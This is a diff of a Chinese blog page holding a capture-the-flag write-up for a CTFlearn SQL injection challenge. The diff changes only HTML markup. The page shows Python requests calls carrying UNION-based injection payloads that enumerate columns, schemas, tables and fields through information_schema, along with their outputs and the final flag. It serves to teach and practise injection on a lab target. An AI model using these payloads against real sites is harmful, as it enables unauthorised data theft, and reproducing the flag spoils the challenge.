@@ -247,7 +247,8 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </header>
 
     <section class="article-content">
-    <p><em>题目链接：(<a href="https://ctflearn.com/challenge/149">https://ctflearn.com/challenge/149</a>)</em></p>
+    <p><em>题目链接：(<a class="link" href="https://ctflearn.com/challenge/149"  target="_blank" rel="noopener"
+    >https://ctflearn.com/challenge/149</a>)</em></p>
 <blockquote>
 <p>此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;</p>
 </blockquote>
@@ -255,16 +256,16 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 <li>根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。</li>
 </ol>
 <blockquote>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">})</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">})</span>
 <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">prettify</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">prettify</span><span class="p">())</span>
 
 <span class="c1"># Output:</span>
 <span class="c1"># Name: Doodle</span>
 <span class="c1"># Bread: Poodle</span>
 <span class="c1"># Color: Pink</span>
 </code></pre></div><p>在数字2之后附上简单的布尔表达式，观察结果。</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 or 1=1&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
@@ -275,13 +276,13 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </ol>
 <blockquote>
 <p>首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
 <span class="c1"># 0 results</span>
 </code></pre></div><p>结果表明3个字段是不对的，那么再增加：</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3,4&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
@@ -289,7 +290,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 <span class="c1"># Breed: 1</span>
 <span class="c1"># Color: 3</span>
 </code></pre></div><p>非常Nice，不仅表明了查询的结果有<strong>四个字段</strong>，而且显示出<strong>每个字段对应的是什么含义</strong>。再试试5个字段：</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,2,3,4,5&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
@@ -304,7 +305,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </ul>
 </blockquote>
 <p>在此仅记录第二种办法。</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
@@ -315,7 +316,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </blockquote>
 <blockquote>
 <p>开始查询webeight数据库中的数据表。</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4&#34;</span><span class="p">})</span>
 
 <span class="c1"># Output:</span>
@@ -332,7 +333,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </blockquote>
 <blockquote>
 <p>得到表之后，要查找字段了。方法差不多，总的来说就是在折腾information_schema库中存储的信息而已。</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">information_schema.columns</span> <span class="nn">where</span> <span class="nn">table_schema</span><span class="o">=</span><span class="mh">0x7765626569676874</span> <span class="ow">and</span> <span class="n">table_name</span><span class="o">=</span><span class="mh">0x7730775f7930755f6630756e645f6d33</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">information_schema.columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mh">0x7765626569676874</span> <span class="ow">and</span> <span class="n">table_name</span><span class="o">=</span><span class="mh">0x7730775f7930755f6630756e645f6d33</span>
 
 <span class="c1"># Output:</span>
 <span class="c1"># Name: f0und_m3</span>
@@ -342,7 +343,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </blockquote>
 <blockquote>
 <p>以上已经得到了目标表的目标字段，使用最后一个简单的查询结束这道题：</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">f0und_m3</span> <span class="kn">from</span> <span class="nn">w0w_y0u_f0und_m3</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">f0und_m3</span> <span class="kn">from</span> <span class="nn">w0w_y0u_f0und_m3</span>
 
 <span class="c1"># Output:</span>
 <span class="c1"># Name: abctf{uni0n_1s_4_gr34t_c0mm4nd}</span>
